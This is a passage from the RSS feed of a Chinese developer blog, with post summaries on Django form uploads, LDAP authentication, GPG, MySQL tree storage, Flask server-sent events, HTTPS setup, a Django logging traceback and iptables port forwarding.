files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;attachment_file&amp;#39;&lt;/span&gt;: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.png&amp;#39;&lt;/span&gt;, open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.png&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt;, {})}
values &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;next&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.xxxx.com/xxxx&amp;#34;&lt;/span&gt;}
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.xxxx.com/upload&amp;#39;&lt;/span&gt;, files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;files, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;values) &lt;span style=&#34;color:#75715e&#34;&gt;# 成功&lt;/span&gt;
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.xxxx.com/upload&amp;#39;&lt;/span&gt;, files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;files, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;values) &lt;span style=&#34;color:#75715e&#34;&gt;# 失败&lt;/span&gt;
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.xxxx.com/upload&amp;#39;&lt;/span&gt;, files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;files, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;values) &lt;span style=&#34;color:#75715e&#34;&gt;# 失败&lt;/span&gt;
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.xxxx.com/upload&amp;#39;&lt;/span&gt;, files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;files, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;values) &lt;span style=&#34;color:#75715e&#34;&gt;# 失败&lt;/span&gt;
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.xxxx.com/upload&amp;#39;&lt;/span&gt;, files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;files, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;values) &lt;span style=&#34;color:#75715e&#34;&gt;# 失败&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不过我今天在调试一个django程序的时候却遇到了大坑————为了偷懒，我直接在&lt;strong&gt;ipython&lt;/strong&gt;中执行了上述代码，第一次提交的时候一切正常，但第二次之后提交就怎么也通过不了django的form验证。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>django-auth-ldap中文文档</title>
      <link>/posts/django-auth-ldap%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/</link>
      <pubDate>Fri, 09 Sep 2016 10:08:51 +0000</pubDate>
      
      <guid>/posts/django-auth-ldap%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/</guid>
      <description>最近在学习如何结合Django和LDAP服务进行用户认证，关于在Centos7上LDAP的服务器如何搭建可以参考这里。
阅读文档的时候发现网上没有关于django-auth-ldap的完整翻译，所以把我阅读文档时的理解记录下来，如有错误还请指正。
django-auth-ldap中文文档</description>
    </item>
    
    <item>
      <title>GPG使用记录</title>
      <link>/posts/gpg%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Mon, 05 Sep 2016 16:05:32 +0000</pubDate>
      
      <guid>/posts/gpg%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
      <description>&lt;p&gt;GPG简单来说是一种加密机制，可以用来加密文件、邮件等。这里以Centos为例记录一下生成密钥以及相关操作。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>在MySQL中存储树状结构</title>
      <link>/posts/%E5%9C%A8mysql%E4%B8%AD%E5%AD%98%E5%82%A8%E6%A0%91%E7%BB%93%E6%9E%84/</link>
      <pubDate>Mon, 15 Aug 2016 17:46:18 +0000</pubDate>
      
      <guid>/posts/%E5%9C%A8mysql%E4%B8%AD%E5%AD%98%E5%82%A8%E6%A0%91%E7%BB%93%E6%9E%84/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://mikehillyer.com/articles/managing-hierarchical-data-in-mysql/&#34;&gt;原文地址&lt;/a&gt;，原文中&lt;code&gt;Hierarchical Data&lt;/code&gt;直译为 &lt;em&gt;分层结构&lt;/em&gt;，这里我翻译成 &lt;em&gt;树状结构&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;补充资源：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://django-mptt.github.io/django-mptt/&#34;&gt;https://django-mptt.github.io/django-mptt/&lt;/a&gt; ，如果你也使用python和django，这个是现成的APP。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;另外，个人觉得这种方法对于搜索的效率提升最大，而相应的新增、删除等操作则会变慢，个人猜测未经测试。&lt;/p&gt;
&lt;p&gt;个人总结的核心：如果一个节点A是节点B的子节点，那么A的左值一定大于B的左值，A的右值一定小于B的右值。或者说，A的左值一定在B的左值和右值之间。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Flask&#43;HTML5实现服务器推送事件</title>
      <link>/posts/flask-html5%E5%AE%9E%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8%E9%80%81%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Thu, 04 Aug 2016 13:59:38 +0000</pubDate>
      
      <guid>/posts/flask-html5%E5%AE%9E%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8%E9%80%81%E4%BA%8B%E4%BB%B6/</guid>
      <description>&lt;p&gt;服务器推送事件(server-sent events，SSE)是一种除websocket、ajax简单轮寻外另一种实现服务器数据主动推送数据到浏览器的方式。&lt;/p&gt;
&lt;p&gt;这里，举一个的例子来说明如何使用基于pyhon的服务端来实现，为了简单我使用flask框架来实现。关键点有2个：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HTTP响应头中包含&lt;code&gt;content-type:text/event-stream&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;流响应&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>centos7安装systemtap</title>
      <link>/posts/centos7%E5%AE%89%E8%A3%85systemtap/</link>
      <pubDate>Wed, 27 Jul 2016 10:46:53 +0000</pubDate>
      
      <guid>/posts/centos7%E5%AE%89%E8%A3%85systemtap/</guid>
      <description>&lt;p&gt;这两天突然对火焰图起了兴趣，至于什么是systemtap、什么是火焰图这里我不多说了，网上有很多介绍，这里说记录一下我的安装过程以及
碰到的坑。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>博客迁移记录</title>
      <link>/posts/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Fri, 22 Jul 2016 11:35:19 +0000</pubDate>
      
      <guid>/posts/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95/</guid>
      <description>&lt;p&gt;经过3天的不懈努力，终于完成了博客的迁移工作，同时删除了一些无病呻吟的、没干货的文章。&lt;/p&gt;
&lt;p&gt;现在本博客基于 &lt;a href=&#34;https://hexo.io/&#34;&gt;hexo&lt;/a&gt; 以及使用主题 &lt;a href=&#34;https://github.com/LouisBarranqueiro/hexo-theme-tranquilpeak&#34;&gt;tranquilpeak&lt;/a&gt; 构建，这个主题原生支持百度统计以及多说评论，而且不使用google相关资源，对于我这种前端盲很是友好。&lt;/p&gt;
&lt;p&gt;唯一不足就是这个主题使用cloudflare的CDN，速度相对于国内的CDN还是慢一些，可以修改成国内自己喜欢的，代码位于&lt;code&gt;themes/tranquilpeak/layout/_partial/script.ejs &lt;/code&gt;第50行。&lt;/p&gt;
&lt;p&gt;同时部署在github以及coding上，并使用dnspod进行域名解析，dnspod最大的好处就是支持国内外不同的来源解析到不同的地址，对于国外的IP解析到github，对于国内的IP则解析到coding。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>MySQL数据库修复</title>
      <link>/posts/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%AE%E5%A4%8D/</link>
      <pubDate>Mon, 18 Jul 2016 22:28:36 +0000</pubDate>
      
      <guid>/posts/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%AE%E5%A4%8D/</guid>
      <description>&lt;p&gt;把博客服务器搬到香港之后，发现这个供应商的服务器经常自动重启，不过mysql、nginx都设定了开机自启动，所以也就没当事。结果今天出了大问题：服务器ip可以ping的通，但博客就是无法访问，登录到服务器一看，我擦——整个数据盘不见了！由于把网站放在了/home目录下，而现在home目录空荡荡的啥也没有。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>django自定义用户模型</title>
      <link>/posts/django%E8%87%AA%E5%AE%9A%E4%B9%89%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9E%8B/</link>
      <pubDate>Wed, 29 Jun 2016 10:13:27 +0000</pubDate>
      
      <guid>/posts/django%E8%87%AA%E5%AE%9A%E4%B9%89%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9E%8B/</guid>
      <description>&lt;p&gt;Django最方便的一点可以说就是自带的用户系统了，不过某些情况下自带的用户系统不太符合项目需求，比如你想添加几个字段怎么办？当然可以使用自定Model然后外键关联User类来实现，不过一方面关联查询的效率比直接查询效率要低，另一方面想删除系统自带用户系统的某些字段怎么办呢？&lt;/p&gt;
&lt;p&gt;所以，自定义用户模型可以说是一种很常见的需求。这里以Django1.9为例，记录一下自定义用户模型的方法。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Django-REST-framework中文文档教程</title>
      <link>/posts/django-rest-framework%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3%E6%95%99%E7%A8%8B/</link>
      <pubDate>Mon, 27 Jun 2016 13:44:46 +0000</pubDate>
      
      <guid>/posts/django-rest-framework%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3%E6%95%99%E7%A8%8B/</guid>
      <description>目前网上的关于Django-REST-framework中文文档教程大多数都是你抄我我抄你，也找不出到底是出自谁手以及哪个版本的文档翻译了。于是我决定将自己阅读文档的翻译记录下来，供有需要的人阅读。
但经过排版，发现这种由多章组成的系列教程，在博客上怎么弄都不方便看，所以教程直接放到gitbook上，请移步至:
https://darkcooking.gitbooks.io/django-rest-framework-cn/content/</description>
    </item>
    
    <item>
      <title>启用https提高网站安全性</title>
      <link>/posts/%E5%90%AF%E7%94%A8https%E6%8F%90%E9%AB%98%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E6%80%A7/</link>
      <pubDate>Thu, 23 Jun 2016 14:12:01 +0000</pubDate>
      
      <guid>/posts/%E5%90%AF%E7%94%A8https%E6%8F%90%E9%AB%98%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E6%80%A7/</guid>
      <description>&lt;p&gt;细心的老读者可能发现，本站现在全面启用了https，为啥捏？因为好看！哇哈哈哈……&lt;/p&gt;
&lt;p&gt;这里记录一下Centos6系统上的nginx配置方法。这里我使用 &lt;a href=&#34;http://letsencrypt.org&#34;&gt;letsencrypt&lt;/a&gt; 提供的免费证书，首先访问&lt;a href=&#34;https://certbot.eff.org/&#34;&gt;https://certbot.eff.org/&lt;/a&gt;，然后根据你的实际情况选择webserver和操作系统，这里为了通用性，我选择“Unspecified Webserver on Other UNIX”。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>解决django使用logging时“character mapping must return integer, None or unicode”错误</title>
      <link>/posts/%E8%A7%A3%E5%86%B3django%E4%BD%BF%E7%94%A8logging%E6%97%B6character-mapping-must-return-integer-none-or-unicode%E9%94%99%E8%AF%AF/</link>
      <pubDate>Tue, 21 Jun 2016 17:42:27 +0000</pubDate>
      
      <guid>/posts/%E8%A7%A3%E5%86%B3django%E4%BD%BF%E7%94%A8logging%E6%97%B6character-mapping-must-return-integer-none-or-unicode%E9%94%99%E8%AF%AF/</guid>
      <description>&lt;p&gt;今天调试Django项目时候，使用Logging记录异常并发送邮件给网站管理人员，测试时候始终报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;Traceback (most recent call last):
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/wsgiref/handlers.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; run
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; application(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;environ, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start_response)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/core/handlers/wsgi.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;177&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; __call__
    response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_response(request)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/core/handlers/base.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;230&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; get_response
    response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;handle_uncaught_exception(request, resolver, sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exc_info())
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/core/handlers/base.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;284&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; handle_uncaught_exception
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;request&amp;#39;&lt;/span&gt;: request
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/logging/__init__.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;1185&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; error
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_log(ERROR, msg, args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/logging/__init__.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;1278&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; _log
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;handle(record)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/logging/__init__.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;1288&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; handle
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;callHandlers(record)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/logging/__init__.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;1328&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; callHandlers
    hdlr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;handle(record)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/logging/__init__.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;751&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; handle
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;emit(record)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/utils/log.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; emit
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_mail(subject, message, fail_silently&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True, html_message&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;html_message)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/utils/log.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; send_mail
    mail&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mail_admins(subject, message, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, connection&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connection(), &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/core/mail/__init__.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; mail_admins
    mail&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(fail_silently&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fail_silently)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/core/mail/message.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;292&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; send
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_connection(fail_silently)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_messages([self])
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/core/mail/backends/smtp.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; send_messages
    new_conn_created &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open()
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xsy/.virtualenvs/dz_pro/lib/python2.7/site-packages/django/core/mail/backends/smtp.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; open
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connection&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;username, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;password)
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/smtplib.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;607&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; login
    (code, resp) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;docmd(encode_cram_md5(resp, user, password))
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/smtplib.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;571&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; encode_cram_md5
    response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; user &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hmac&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;HMAC(password, challenge)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()
  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib64/python2.7/hmac.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; __init__
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;outer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update(key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;translate(trans_5C))
&lt;span style=&#34;color:#a6e22e&#34;&gt;TypeError&lt;/span&gt;: character mapping must &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; integer, None &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; unicode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据错误提示，追进了hmac.py中看了源码，发现key其实就是一个字符串，是配置在settings中的EMAIL_HOST_USER以及EMAIL_HOST_PASSWORD，而translate函数则是根据给出的参数表将字符串进行映射加密的，而且是最简单的凯撒加密法。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Django常用三方库</title>
      <link>/posts/django%E5%B8%B8%E7%94%A8%E4%B8%89%E6%96%B9%E5%BA%93/</link>
      <pubDate>Wed, 15 Jun 2016 13:55:06 +0000</pubDate>
      
      <guid>/posts/django%E5%B8%B8%E7%94%A8%E4%B8%89%E6%96%B9%E5%BA%93/</guid>
      <description>&lt;p&gt;更新于2017.01.10&lt;/p&gt;
&lt;p&gt;首先安利本书《two scoops of django1.8》目前还没有中文版，不过是我看过关于django的书中收获最大的一本。本来有机会和作者面基，可惜我大天朝的签证太难办了，只得作罢。&lt;/p&gt;
&lt;p&gt;这里推荐三方库的大部分出自这本书，移除了部分失效或者不维护的库，添加了一些其他库，强烈建议大家阅读原书。&lt;/p&gt;
&lt;p&gt;下面的模块有些是django模块，有些则是python模块，可以脱离django直接使用。&lt;/p&gt;
&lt;p&gt;话说那些复制到别地方然后标注“原创”的，敢加个本文链接不？手工整理很累的好不？&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>linux系统的3种端口转发方式</title>
      <link>/posts/linux%E7%B3%BB%E7%BB%9F%E7%9A%843%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%96%B9%E5%BC%8F/</link>
      <pubDate>Fri, 20 May 2016 11:47:08 +0000</pubDate>
      
      <guid>/posts/linux%E7%B3%BB%E7%BB%9F%E7%9A%843%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%96%B9%E5%BC%8F/</guid>
      <description>&lt;p&gt;很多情况下我们都需要进行端口转发，这里以centos为例记录一下linux系统上端口转发的3种方式。&lt;/p&gt;
&lt;h2 id=&#34;iptables&#34;&gt;iptables&lt;/h2&gt;
&lt;p&gt;想利用iptables进行端口转发，首先要打开内核转发功能：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &amp;quot;net.ipv4.ip_forward = 1&amp;quot; &amp;gt;&amp;gt; /etc/sysctl.conf
sysctl -p
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后编辑转发的服务器的/etc/sysconfig/iptables文件，添加&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*nat
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A PREROUTING -d 转发服务器的ip -p tcp --dport 转发服务器的端口 -j DNAT --to-destination 目标ip：端口
-A POSTROUTING -d 目标ip -p tcp --dport 目标端口 -j SNAT --to 转发服务器的Ip
COMMIT
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重启Iptables后即可生效，在我们本机链接转发服务器的ip和端口实际上就是链接目标机器的ip和端口了。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>eventlet，django，requests问题杂记</title>
      <link>/posts/eventletdjangorequests%E9%97%AE%E9%A2%98%E6%9D%82%E8%AE%B0/</link>
      <pubDate>Tue, 03 May 2016 13:28:49 +0000</pubDate>
      
      <guid>/posts/eventletdjangorequests%E9%97%AE%E9%A2%98%E6%9D%82%E8%AE%B0/</guid>
      <description>&lt;p&gt;最近使用django+requests+eventlet做了个小程序，eventlet用来替代原生的多线程，最后发现有关manage.py的功能全都不能用了，报错信息类似：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;django&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;db&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;utils&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DatabaseError: DatabaseWrapper objects created &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a thread can only be used &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; that same thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; The object &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; alias &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; was created &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; thread id &lt;span style=&#34;color:#ae81ff&#34;&gt;139911009593152&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; this &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; thread id &lt;span style=&#34;color:#ae81ff&#34;&gt;51055504.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;产生这个问题的原因在于我的monky_patch()是在爬虫模块中执行，而希望这个爬虫模块能够保持独立性不希望和django融合的太深，所以解决问题只需根据实际需求在manage.py或settings.py或wsgi.py中先把monkey_patch()执行了即可。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>VirtualBOX虚拟机网络互通同时访问外网</title>
      <link>/posts/virtualbox%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%92%E9%80%9A%E5%90%8C%E6%97%B6%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91/</link>
      <pubDate>Fri, 29 Apr 2016 13:54:35 +0000</pubDate>
      
